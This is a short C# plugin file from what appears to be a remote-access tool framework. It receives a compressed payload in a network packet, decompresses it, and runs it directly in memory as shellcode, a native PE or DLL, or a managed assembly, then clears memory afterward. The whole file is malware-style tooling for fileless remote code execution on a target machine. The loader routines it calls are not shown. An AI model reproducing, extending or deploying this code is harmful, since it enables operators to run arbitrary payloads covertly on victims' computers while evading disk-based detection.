using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            MemoryExecutionPacket memoryExecutionPacket = (MemoryExecutionPacket)loadingAPI.currentPacket;
            byte[] decompressed = Compressor.QuickLZ.Decompress(memoryExecutionPacket.payload);
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.MEM_EXEC_SHELLCODE:
                    ShellCode.RunShellCode(decompressed);
                    break;

                case PacketType.MEM_EXEC_NATIVE_PE:
                    NativePE.LoadPE(decompressed);
                    break;

                case PacketType.MEM_EXEC_NATIVE_DLL:
                    NativeDll.LoadDll(decompressed);
                    break;

                case PacketType.MEM_EXEC_MANAGED_DLL:
                    ManagedDll.LoadDll(decompressed, memoryExecutionPacket.managedEntryPoint);
                    break;

                case PacketType.MEM_EXEC_MANAGED_PE:
                    ManagedExe.LoadExe(decompressed);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
